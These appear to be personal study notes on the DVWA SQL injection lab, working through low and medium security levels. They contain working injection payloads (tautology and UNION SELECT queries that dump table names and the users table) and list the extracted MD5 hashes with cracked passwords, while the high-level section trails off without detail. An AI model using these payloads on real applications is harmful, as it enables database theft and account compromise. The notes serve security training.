Objective
There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.

>[!important] Security is Set to Low

SQL injection is where an attacker is able to manipulate database queries made by an application.
![[Pasted image 20231010211752.png]]


```
1' or 1=1# 
```
We get the data of all the user with this sql command
![[Pasted image 20231010212031.png]]

Let's fire up BurpSuite so that we can dig deeper and get the password
```
1' union select null,table_name from information_schema.tables#
```
![[Pasted image 20231010213634.png]]
We got the user table name from this and will also get the columns name as well
```
1' union select null,column_name from information_schema.columns#
user_id
```

Finally we got the password hash
```
1' union select user_id,password from users#
```
![[Pasted image 20231010214249.png]]
```
5f4dcc3b5aa765d61d8327deb882cf99
password

e99a18c428cb38d5f260853678922e03
abc123

8d3533d75ae2c3966d7e0d4fcc69216b
charley

0d107d09f5bbe40cade3de5c71e9e9b7
letmein

5f4dcc3b5aa765d61d8327deb882cf99
password
```
It's md5 hashes we can crack them using hashcat or online tools 
![[Pasted image 20231010214436.png]]


>[!important] Let's now change the level to medium and will see if any check are being happening now:

Now for this we have to run the burpsuite as we don't have any option here
```
1 or 1=1# 
```
![[Pasted image 20231010215429.png]]

Yes with a little tweaks the command worked as we are not using any quotes
![[Pasted image 20231010221803.png]]

Let's simply the password
```
1 union select user_id,password from users#
```
![[Pasted image 20231010221927.png]]

The rest of the process is same so will skip it here. And remember that here we have to add URL encode character which we can do by simply pressing Ctrl + u



>[!important] Let's change the level to High

Let's see what's happening in high will go through the code 1st 
So what's happening here is that when we click on the click it opens up a site where we have to submit the query 
and when we close it and query is checked and run on the main site
![[Pasted image 20231010222609.png]]

![[Pasted image 20231010222621.png]]

But the query is running so it's of not use i thing so
![[Pasted image 20231010222651.png]]

![[Pasted image 20231010222756.png]]

got the password i don't know but with little tweaks here and there i was able to exploit it.

Resources:
https://appsecexplained.gitbook.io/appsecexplained/common-vulns/injection/sql-injection-overview
https://www.youtube.com/watch?v=5bj1pFmyyBA

